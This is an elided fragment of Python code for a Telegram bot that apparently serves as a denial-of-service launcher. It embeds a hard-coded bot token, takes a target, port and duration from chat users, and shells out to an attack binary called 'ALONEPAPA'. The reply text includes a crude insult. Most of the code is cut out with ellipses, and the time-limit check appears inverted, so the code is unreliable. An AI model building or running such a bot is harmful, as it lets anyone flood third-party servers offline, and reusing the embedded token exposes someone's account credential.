...
bot = telebot.TeleBot('7921815407:AAGWLMj5RNJ4ePEa-XaSIhu58bfQaInhC48')
    ...
    if len(details) == 3:
        ...
        try:
            ...
            if attack_time > MAX_ATTACK_TIME:
                ...
                full_command = f"./ALONEPAPA {target} {port} {attack_time} 1200"  # ✅ Correct variable name
                ...
                response = (
                    ...
                    f"𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: SBR KR LOVDE ALL READY ATTACK CHAL RHA HAI"
                )
